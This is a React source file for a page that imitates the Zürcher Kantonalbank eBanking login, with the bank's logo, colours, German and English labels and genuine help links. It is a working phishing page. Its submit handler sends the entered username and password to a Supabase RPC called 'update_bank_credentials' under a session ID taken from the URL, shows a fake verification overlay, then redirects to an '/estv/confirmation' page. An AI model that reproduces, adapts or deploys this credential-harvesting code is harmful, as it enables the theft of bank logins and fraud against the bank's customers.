import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { HelpCircle, ChevronDown, User, Eye, EyeOff } from "lucide-react";
import logoAsset from "@/assets/zuercher-kantonalbank-logo.svg.asset.json";

const BLUE = "#003CB4";
const BLUE_HOVER = "#0a6cff";
const OUTLINE = "#65a6fb";
const DIVIDER = "#a5ccf8";
const CARD_BG = "#edf5ff";

type Lang = "de" | "en";

const T = {
  de: {
    title: "Login eBanking",
    user: "Benutzername",
    pw: "Passwort",
    forgot: "Passwort vergessen?",
    submit: "Weiter",
    help: "Benötigen Sie Unterstützung?",
    support: "Support",
    notLoggedIn: "Sie sind nicht angemeldet",
    legal: "Rechtliches",
    general: "Allgemeine Informationen",
    links: [
      "Wie aktiviere ich ein neues Smartphone?",
      "Häufige Fragen (FAQ)",
      "eBanking kennenlernen",
    ],
  },
  en: {
    title: "Login eBanking",
    user: "Username",
    pw: "Password",
    forgot: "Forgot password?",
    submit: "Continue",
    help: "Need support?",
    support: "Support",
    notLoggedIn: "You are not logged in",
    legal: "Legal",
    general: "General information",
    links: [
      "How do I activate a new smartphone?",
      "Frequently asked questions (FAQ)",
      "Get to know eBanking",
    ],
  },
} as const;

const quicklinkHrefs = [
  "https://www.zkb.ch/de/hilfe/skf/smartphone-oder-tablet-ersetzen.html",
  "https://www.zkb.ch/de/hilfe.html#private/haeufige-fragen",
  "https://www.zkb.ch/de/private/digitales-banking/ebanking.html",
];

type FieldProps = {
  id: string;
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
  togglePassword?: boolean;
};

const FloatingField = ({
  id,
  label,
  type = "text",
  value,
  onChange,
  togglePassword,
}: FieldProps) => {
  const [show, setShow] = useState(false);
  const effectiveType = togglePassword ? (show ? "text" : "password") : type;

  return (
    <div
      className="group relative w-full border-[2px] border-[#65a6fb] transition-colors rounded-none hover:border-[#003CB4] focus-within:border-[#003CB4]"
    >
      <input
        id={id}
        type={effectiveType}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder=" "
        className={`peer w-full bg-transparent outline-none px-3 pt-5 pb-2 text-[15px] text-[#003CB4] placeholder-transparent rounded-none ${
          togglePassword ? "pr-10" : ""
        }`}
      />
      <label
        htmlFor={id}
        className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-[15px] text-[#003CB4] transition-all duration-200
                   
                   peer-focus:top-1.5 peer-focus:translate-y-0 peer-focus:text-[11px]
                   peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[11px]"
      >
        {label}
      </label>
      {togglePassword && (
        <button
          type="button"
          onClick={() => setShow((s) => !s)}
          aria-label={show ? "Passwort verbergen" : "Passwort anzeigen"}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-[#003CB4] hover:text-[#0a6cff]"
        >
          {show ? <EyeOff size={18} /> : <Eye size={18} />}
        </button>
      )}
    </div>
  );
};

type PopoverKey = "help" | "lang" | "user" | null;

const PopoverHover = ({
  children,
  hoverColor = BLUE_HOVER,
  baseColor = BLUE,
  className = "",
  underline = false,
  bold = false,
  onClick,
}: {
  children: React.ReactNode;
  hoverColor?: string;
  baseColor?: string;
  className?: string;
  underline?: boolean;
  bold?: boolean;
  onClick?: () => void;
}) => (
  <span
    onClick={onClick}
    className={`cursor-pointer ${underline ? "underline" : ""} ${bold ? "font-bold" : ""} ${className}`}
    style={{ color: baseColor }}
    onMouseEnter={(e) => (e.currentTarget.style.color = hoverColor)}
    onMouseLeave={(e) => (e.currentTarget.style.color = baseColor)}
  >
    {children}
  </span>
);

const ChZuercherKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [benutzername, setBenutzername] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<Lang>("de");
  const [popover, setPopover] = useState<PopoverKey>(null);

  const headerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (headerRef.current && !headerRef.current.contains(e.target as Node)) {
        setPopover(null);
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  usePageMeta("Zürcher Kantonalbank – eBanking", logoAsset.url);

  const t = T[lang];

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: benutzername,
        p_password: passwort,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const popoverShell =
    "absolute right-0 top-full mt-2 bg-white p-5 rounded-none z-50 min-w-[260px]";
  const popoverStyle = { boxShadow: "0 6px 24px rgba(0,0,0,0.18)" } as const;

  const toggle = (k: Exclude<PopoverKey, null>) =>
    setPopover((p) => (p === k ? null : k));

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Header */}
        <header
          ref={headerRef}
          className="w-full flex items-center justify-between py-4 px-6"
          style={{ color: BLUE }}
        >
          <img src={logoAsset.url} alt="Zürcher Kantonalbank" className="h-6 md:h-8" />
          <nav className="flex items-center gap-6 text-[15px]">
            {/* Help */}
            <div className="relative">
              <button
                type="button"
                aria-label="Hilfe"
                className="flex items-center"
                onClick={() => toggle("help")}
              >
                <HelpCircle size={22} strokeWidth={1.75} />
              </button>
              {popover === "help" && (
                <div className={popoverShell} style={popoverStyle}>
                  <div className="font-bold text-sm" style={{ color: BLUE }}>
                    {t.help}
                  </div>
                  <div className="mt-3 text-sm leading-6" style={{ color: BLUE }}>
                    <div>Mo - Fr 08:00 - 22:00</div>
                    <div>Sa - So 09:00 - 18:00</div>
                  </div>
                </div>
              )}
            </div>

            {/* Language */}
            <div className="relative">
              <button
                type="button"
                className="flex items-center gap-1"
                onClick={() => toggle("lang")}
              >
                <span>{lang === "de" ? "De" : "En"}</span>
                <ChevronDown size={16} strokeWidth={2} />
              </button>
              {popover === "lang" && (
                <div className="absolute right-0 top-full mt-2 bg-white px-4 py-3 z-50 inline-block" style={popoverStyle}>
                  <div className="flex flex-col gap-2 text-[15px]">
                    {(["de", "en"] as Lang[]).map((l) => (
                      <button
                        key={l}
                        type="button"
                        onClick={() => {
                          setLang(l);
                          setPopover(null);
                        }}
                        className="text-left"
                        style={{ color: lang === l ? OUTLINE : BLUE }}
                      >
                        {l === "de" ? "De" : "En"}
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* User */}
            <div className="relative">
              <button
                type="button"
                aria-label="Konto"
                className="flex items-center gap-1"
                onClick={() => toggle("user")}
              >
                <User size={22} strokeWidth={1.75} />
                <ChevronDown size={16} strokeWidth={2} />
              </button>
              {popover === "user" && (
                <div className={popoverShell} style={popoverStyle}>
                  <div className="text-sm" style={{ color: BLUE }}>
                    {t.notLoggedIn}
                  </div>
                  <div
                    className="my-3"
                    style={{ borderTop: `2px solid ${DIVIDER}` }}
                  />
                  <div className="flex flex-col gap-2 text-sm">
                    <span className="font-bold" style={{ color: BLUE }}>
                      © Zürcher Kantonalbank
                    </span>
                    <PopoverHover underline>{t.legal}</PopoverHover>
                    <PopoverHover underline>{t.general}</PopoverHover>
                  </div>
                </div>
              )}
            </div>
          </nav>
        </header>

        {/* Divider */}
        <div className="w-full" style={{ borderTop: `2px solid ${DIVIDER}` }} />

        {/* Body */}
        <main className="flex-1 px-8 md:px-32 lg:px-48 py-16 md:py-24">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-20 lg:gap-24">
            {/* Login */}
            <section className="flex flex-col items-start max-w-[380px] w-full">
              <h1 className="text-[32px] font-bold mb-8" style={{ color: BLUE }}>
                {t.title}
              </h1>

              <div className="w-full space-y-4">
                <FloatingField
                  id="benutzername"
                  label={t.user}
                  value={benutzername}
                  onChange={setBenutzername}
                />
                <FloatingField
                  id="passwort"
                  label={t.pw}
                  type="password"
                  togglePassword
                  value={passwort}
                  onChange={setPasswort}
                />
              </div>

              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="mt-3 text-sm underline"
                style={{ color: BLUE }}
              >
                {t.forgot}
              </a>

              <button
                onClick={handleSubmit}
                className="mt-8 text-white text-[15px] font-bold px-12 py-2.5 rounded-none transition-colors"
                style={{ backgroundColor: BLUE }}
                onMouseEnter={(e) =>
                  (e.currentTarget.style.backgroundColor = BLUE_HOVER)
                }
                onMouseLeave={(e) =>
                  (e.currentTarget.style.backgroundColor = BLUE)
                }
              >
                {t.submit}
              </button>
            </section>

            {/* Support Card */}
            <aside
              className="p-8 rounded-none"
              style={{ backgroundColor: CARD_BG, color: BLUE }}
            >
              <h2 className="font-bold text-base mb-6">{t.help}</h2>

              <ul className="space-y-1.5">
                {t.links.map((label, i) => (
                  <li key={quicklinkHrefs[i]} className="flex items-center">
                    <span
                      className="inline-block mr-3"
                      style={{ width: 20, borderTop: `1px solid ${BLUE}` }}
                    />
                    <a
                      href={quicklinkHrefs[i]}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[15px] underline"
                      style={{ color: BLUE }}
                    >
                      {label}
                    </a>
                  </li>
                ))}
              </ul>

              <h3 className="font-bold text-base mt-8 mb-2">{t.support}</h3>
              <div className="text-sm leading-6">
                <div>Mo - Fr 08:00 - 22:00</div>
                <div>Sa - So 09:00 - 18:00</div>
              </div>
            </aside>
          </div>
        </main>
      </div>
    </>
  );
};

export default ChZuercherKantonalbank;
